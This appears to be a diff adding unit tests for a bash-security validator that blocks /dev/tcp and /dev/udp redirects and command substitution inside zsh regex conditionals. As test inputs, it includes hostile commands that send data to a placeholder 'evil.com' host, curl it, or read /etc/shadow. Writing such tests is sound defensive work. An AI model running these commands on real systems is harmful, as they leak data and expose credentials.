@@ -307,3 +307,129 @@ describe('validateBashSecurity — heredoc early-allow integration', () => {
     assert.equal(result.safe, true, `Expected safe but got: ${result.message}`);
   });
 });
+
+// ---------------------------------------------------------------------------
+// detectZshRegexConditional
+// ---------------------------------------------------------------------------
+
+import { detectZshRegexConditional, validateDevTcpUdpRedirects } from '../src/tools/bash-security';
+
+// ---------------------------------------------------------------------------
+// validateDevTcpUdpRedirects — blocks /dev/tcp and /dev/udp network redirects
+// ---------------------------------------------------------------------------
+
+describe('validateDevTcpUdpRedirects', () => {
+  it('blocks echo redirected to /dev/tcp', () => {
+    const r = validateDevTcpUdpRedirects('echo hi > /dev/tcp/evil.com/80');
+    assert.equal(r.safe, false);
+    assert.ok(r.message!.includes('/dev/tcp'));
+  });
+
+  it('blocks cat from /dev/udp', () => {
+    const r = validateDevTcpUdpRedirects('cat < /dev/udp/10.0.0.1/53');
+    assert.equal(r.safe, false);
+    assert.ok(r.message!.includes('/dev/udp'));
+  });
+
+  it('blocks exec with /dev/tcp bidirectional redirect', () => {
+    const r = validateDevTcpUdpRedirects('exec 3<>/dev/tcp/host/443');
+    assert.equal(r.safe, false);
+  });
+
+  it('blocks /dev/tcp in a compound command', () => {
+    const r = validateDevTcpUdpRedirects('bash -c "cat /dev/tcp/evil.com/80"');
+    assert.equal(r.safe, false);
+  });
+
+  it('blocks /dev/udp with uppercase (case-insensitive)', () => {
+    const r = validateDevTcpUdpRedirects('echo > /DEV/TCP/host/80');
+    assert.equal(r.safe, false);
+  });
+
+  it('allows /dev/null redirects', () => {
+    assert.equal(validateDevTcpUdpRedirects('cmd > /dev/null').safe, true);
+  });
+
+  it('allows /dev/zero references', () => {
+    assert.equal(validateDevTcpUdpRedirects('dd if=/dev/zero of=file').safe, true);
+  });
+
+  it('allows /dev/urandom reads', () => {
+    assert.equal(validateDevTcpUdpRedirects('cat /dev/urandom | head -c 16').safe, true);
+  });
+
+  it('allows normal commands without /dev paths', () => {
+    assert.equal(validateDevTcpUdpRedirects('echo hello world').safe, true);
+    assert.equal(validateDevTcpUdpRedirects('git status').safe, true);
+    assert.equal(validateDevTcpUdpRedirects('npm test').safe, true);
+  });
+
+  it('allows empty command', () => {
+    assert.equal(validateDevTcpUdpRedirects('').safe, true);
+  });
+});
+
+describe('validateDevTcpUdpRedirects — integration with validateBashSecurity', () => {
+  it('blocks /dev/tcp through the full validator (interactive mode)', () => {
+    const r = validateBashSecurity('echo data > /dev/tcp/evil.com/80');
+    assert.equal(r.safe, false);
+  });
+
+  it('blocks /dev/tcp through the full validator (detached mode)', () => {
+    const r = validateBashSecurity('echo data > /dev/tcp/evil.com/80', { detachedMode: true });
+    assert.equal(r.safe, false);
+  });
+
+  it('blocks /dev/udp through the full validator (interactive mode)', () => {
+    const r = validateBashSecurity('cat < /dev/udp/10.0.0.1/53');
+    assert.equal(r.safe, false);
+  });
+
+  it('blocks /dev/udp through the full validator (detached mode)', () => {
+    const r = validateBashSecurity('cat < /dev/udp/10.0.0.1/53', { detachedMode: true });
+    assert.equal(r.safe, false);
+  });
+});
+
+describe('detectZshRegexConditional', () => {
+  it('blocks $(...) inside [[ =~ ]]', () => {
+    const r = detectZshRegexConditional('[[ $x =~ $(cat /etc/shadow) ]]');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason?.includes('Command substitution'));
+  });
+
+  it('blocks backtick substitution inside [[ =~ ]]', () => {
+    const r = detectZshRegexConditional('[[ $x =~ `whoami` ]]');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks nested $(...) with arguments', () => {
+    const r = detectZshRegexConditional('[[ $var =~ $(curl http://evil.com) ]]');
+    assert.equal(r.blocked, true);
+  });
+
+  it('allows plain regex pattern in [[ =~ ]]', () => {
+    const r = detectZshRegexConditional('[[ $var =~ ^[0-9]+$ ]]');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows simple == comparison', () => {
+    const r = detectZshRegexConditional('[[ $var == "hello" ]]');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows plain variable expansion in [[ =~ ]]', () => {
+    const r = detectZshRegexConditional('[[ $x =~ ${pattern} ]]');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows commands without [[ =~ ]]', () => {
+    const r = detectZshRegexConditional('echo hello && grep foo bar');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows empty command', () => {
+    const r = detectZshRegexConditional('');
+    assert.equal(r.blocked, false);
+  });
+});
